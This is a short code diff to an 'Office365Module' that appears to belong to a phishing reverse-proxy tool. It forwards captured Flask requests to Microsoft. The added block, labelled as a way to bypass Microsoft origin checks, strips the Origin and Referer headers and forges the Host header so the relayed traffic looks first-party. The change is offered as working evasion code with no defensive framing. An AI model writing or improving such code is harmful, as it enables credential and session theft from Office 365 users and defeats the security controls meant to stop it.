@@ -17,6 +17,7 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
 import re
+import urllib.parse
 
 
 class Office365Module(BaseModule):
@@ -896,6 +897,16 @@ class Office365Module(BaseModule):
             headers['Sec-Fetch-Site'] = 'cross-site'
             headers['Cache-Control'] = 'max-age=0'
             
+            # --- Header sanitisation to bypass Microsoft origin checks ---
+            # Remove Origin and Referer so Microsoft sees no foreign origin
+            headers.pop('Origin', None)
+            headers.pop('Referer', None)
+            
+            # Ensure Host header matches the real Microsoft host
+            target_host_hdr = urllib.parse.urlparse(target_url).netloc
+            headers['Host'] = target_host_hdr
+            # ------------------------------------------------------------
+
             # Make the request to Microsoft
             if flask_request.method == 'POST':
                 resp = requests.post(target_url, headers=headers, data=flask_request.get_data(), 
